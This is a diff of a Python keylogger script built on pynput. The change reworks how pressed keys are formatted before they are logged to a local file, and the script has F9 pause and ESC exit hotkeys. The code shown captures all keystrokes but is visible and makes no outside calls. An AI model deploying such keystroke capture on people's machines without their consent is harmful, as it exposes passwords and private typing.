@@ -1,17 +1,40 @@
 from pynput import keyboard
 import datetime
 import os
+
+# File path setup
 log_file_path = "keylogger/log.txt"
 os.makedirs(os.path.dirname(log_file_path), exist_ok=True)
 
+# Global toggle state
 is_logging = True
 
 def format_key(key):
-    """Cleans up key representation"""
-    if hasattr(key, 'char'):
-        return key.char if key.char is not None else str(key)
-    else:
-        return str(key).replace('Key.', '')
+    try:
+        # For normal alphanumeric keys
+        return key.char
+    except AttributeError:
+        # For special keys like space, enter, etc.
+        special_keys = {
+            keyboard.Key.space: "Space",
+            keyboard.Key.enter: "Enter",
+            keyboard.Key.tab: "Tab",
+            keyboard.Key.backspace: "Backspace",
+            keyboard.Key.shift: "Shift",
+            keyboard.Key.shift_r: "Shift",
+            keyboard.Key.ctrl: "Ctrl",
+            keyboard.Key.ctrl_r: "Ctrl",
+            keyboard.Key.alt: "Alt",
+            keyboard.Key.alt_r: "Alt",
+            keyboard.Key.esc: "Escape",
+            keyboard.Key.caps_lock: "CapsLock",
+            keyboard.Key.delete: "Delete",
+            keyboard.Key.up: "Arrow Up",
+            keyboard.Key.down: "Arrow Down",
+            keyboard.Key.left: "Arrow Left",
+            keyboard.Key.right: "Arrow Right"
+        }
+        return special_keys.get(key, str(key).replace('Key.', ''))
 
 def on_press(key):
     """Handles key press events: log, pause/resume, exit"""
@@ -21,7 +44,7 @@ def on_press(key):
         print("[*] ESC pressed. Exiting keylogger.")
         return False  # Stop listener
 
-    elif key == keyboard.Key.f9: #If you want to change the hotkey, you can change it here
+    elif key == keyboard.Key.f9:
         is_logging = not is_logging
         status = "resumed" if is_logging else "paused"
         print(f"[*] Logging {status.upper()}.")
